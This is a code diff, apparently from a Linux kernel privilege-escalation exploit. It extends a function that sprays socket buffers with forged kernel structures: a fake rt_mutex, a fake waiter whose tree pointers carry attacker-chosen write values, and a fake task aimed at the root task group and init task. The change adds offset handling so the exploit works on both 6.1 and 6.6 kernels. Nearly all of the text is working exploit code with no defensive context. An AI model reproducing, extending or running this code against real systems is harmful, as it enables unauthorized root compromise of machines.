@@ -347,6 +347,8 @@ int prepare_skb_payload(uintptr_t base) {
   uint64_t task_group = ROOT_TASK_GROUP;
   uint64_t pi_top_task = INIT_TASK;
 
+  int compact = active_offsets && active_offsets->compact_waiter;
+
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
@@ -355,31 +357,66 @@ int prepare_skb_payload(uintptr_t base) {
     put64(p, LOCK_OFF + 0x10, fake_w0);
     put64(p, LOCK_OFF + 0x18, fake_task | 1);
 
-    put64(p, W0_OFF + 0x00, 1);
-    put64(p, W0_OFF + 0x08, 0);
-    put64(p, W0_OFF + 0x10, 0);
-    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
-    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
-    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
-    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+    if (compact) {
+      /* 6.1 COMPACT_RT_MUTEX_WAITER:
+       * tree_entry[0x18] pi_tree_entry[0x18] task@0x30 lock@0x38
+       * wake_state@0x40 prio@0x44 deadline@0x48 ww_ctx@0x50 */
+      put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
+      put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
+      put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
+      put64(p, W0_OFF + 0x18, write_pc);    /* pi_tree_entry.rb_parent_color */
+      put64(p, W0_OFF + 0x20, write_right); /* pi_tree_entry.rb_right */
+      put64(p, W0_OFF + 0x28, write_left);  /* pi_tree_entry.rb_left */
+      put64(p, W0_OFF + 0x30, waiter_task); /* task */
+      put64(p, W0_OFF + 0x38, fake_lock);   /* lock */
+      put32(p, W0_OFF + 0x40, 0);           /* wake_state */
+      put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
+      put64(p, W0_OFF + 0x48, 0);           /* deadline */
+      put64(p, W0_OFF + 0x50, 0);           /* ww_ctx */
+    } else {
+      /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
+      put64(p, W0_OFF + 0x00, 1);
+      put64(p, W0_OFF + 0x08, 0);
+      put64(p, W0_OFF + 0x10, 0);
+      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
+      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
+      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
+      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
+      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+    }
+
+    /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
+    uint32_t ft_prio_off       = compact ? active_offsets->task_prio
+                                         : FAKE_TASK_PRIO_OFF;
+    uint32_t ft_nprio_off      = compact ? active_offsets->task_normal_prio
+                                         : FAKE_TASK_NORMAL_PRIO_OFF;
+    uint32_t ft_tg_off         = compact ? active_offsets->task_sched_task_group
+                                         : FAKE_TASK_TASK_GROUP_OFF;
+    uint32_t ft_pi_lock_off    = compact ? active_offsets->task_pi_lock
+                                         : FAKE_TASK_PI_LOCK_OFF;
+    uint32_t ft_pi_wait_off    = compact ? active_offsets->task_pi_waiters
+                                         : FAKE_TASK_PI_WAITERS_OFF;
+    uint32_t ft_pi_top_off     = compact ? active_offsets->task_pi_top_task
+                                         : FAKE_TASK_PI_TOP_TASK_OFF;
+    uint32_t ft_pi_blocked_off = compact ? active_offsets->task_pi_blocked_on
+                                         : FAKE_TASK_PI_BLOCKED_ON_OFF;
 
     put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
+    put32(p, FAKE_TASK_OFF + ft_prio_off, FAKE_TASK_PRIO);
+    put32(p, FAKE_TASK_OFF + ft_nprio_off, FAKE_TASK_PRIO);
+    put32(p, FAKE_TASK_OFF + ft_pi_lock_off, 0);
     /* Empty PI waiters avoid tree rebalancing during reinsertion. */
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+    put64(p, FAKE_TASK_OFF + ft_pi_wait_off, 0);
+    put64(p, FAKE_TASK_OFF + ft_pi_wait_off + 0x08, 0);
+    put64(p, FAKE_TASK_OFF + ft_tg_off, task_group);
+    put64(p, FAKE_TASK_OFF + ft_pi_top_off, pi_top_task);
+    put64(p, FAKE_TASK_OFF + ft_pi_blocked_off, 0);
 
     put64(p, RIGHT_OFF + 0x00, fake_parent);
     put64(p, RIGHT_OFF + 0x08, 0);
